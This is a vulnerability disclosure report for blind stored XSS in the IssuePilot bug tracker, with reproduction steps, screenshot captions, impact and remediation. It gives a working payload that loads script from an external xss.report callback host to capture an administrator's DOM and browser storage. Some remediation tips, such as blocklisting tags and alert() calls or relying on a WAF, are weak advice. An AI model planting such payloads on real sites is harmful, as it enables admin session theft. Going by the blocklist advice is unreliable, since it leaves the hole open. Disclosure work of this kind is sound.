## Title
Blind XSS - IssuePilot Bug Tracker

## Description
**Affected URL:** https://issuepilot.pwnedbox.site/

The IssuePilot bug reporting functionality accepts user-controlled input in fields such as Bug Title, Description, and Steps to Reproduce. A JavaScript payload containing an external script reference was submitted through the report form.

The submitted report was successfully stored and later accessed through the administrative report-viewing interface. The payload triggered a blind XSS callback when the report was viewed, demonstrating that attacker-controlled content could execute JavaScript in the browser context of the user viewing the report.

The vulnerability is classified as Blind Stored XSS because the execution and callback occur in a separate administrative context rather than being directly visible to the report submitter.

## Steps to Reproduce

1. Open the following URL in a browser:`https://issuepilot.pwnedbox.site/submit.php`
2. Enter the following payload into the Bug Title field:`"><script src=https://xss.report/c/priyanshxop></script>`
3. Enter the same payload into the Description and Steps to Reproduce fields.
4. Complete the required fields and submit the bug report.
5. Observe the successful report submission message.
6. Log in to the application's administrative interface using an authorized test account.
7. Open the submitted bug report from the admin panel.
8. Verify that the submitted content is rendered in the report details and that the external XSS callback is received.

## POC (Proof of Concept)

Screenshot 1: Payload entered into Bug Title, Description, and Steps to Reproduce.

<img width="1917" height="967" alt="image" src="https://github.com/user-attachments/assets/26f0e008-cea4-430d-9aa8-ad19b6c0b299" />

Screenshot 2: Payload reflected in the Expected Behavior, Actual Behavior, Browser/Device, and Your Name fields.

<img width="1918" height="967" alt="image" src="https://github.com/user-attachments/assets/b4181b2f-2002-497c-a7c5-2f382c731803" />

Screenshot 3: Bug report submitted successfully.

<img width="1916" height="963" alt="image" src="https://github.com/user-attachments/assets/54ecc2f0-d7a5-41f5-911e-f7d9bdfd5535" />

Screenshot 4: Administrative login page showing the test account login.

<img width="1908" height="965" alt="image" src="https://github.com/user-attachments/assets/29a366d9-f801-4ed1-8c9d-190a5d168f14" />

Screenshot 5: Submitted report opened in the admin panel, showing the stored report content.

<img width="1917" height="973" alt="image" src="https://github.com/user-attachments/assets/60aa9cee-d41a-426a-954e-74ab1b5c6f12" />

Screenshot 6: XSS.Report activity dashboard showing callback activity associated with the IssuePilot report.

<img width="1918" height="966" alt="image" src="https://github.com/user-attachments/assets/2dcf3ee4-acc6-4e89-b503-e75960feef63" />

Screenshot 7: XSS.Report details showing the captured DOM and browser storage information associated with the callback.

<img width="1918" height="958" alt="image" src="https://github.com/user-attachments/assets/bb3ff3d1-df33-436a-b6b4-15d82e16a7a0" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.


## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
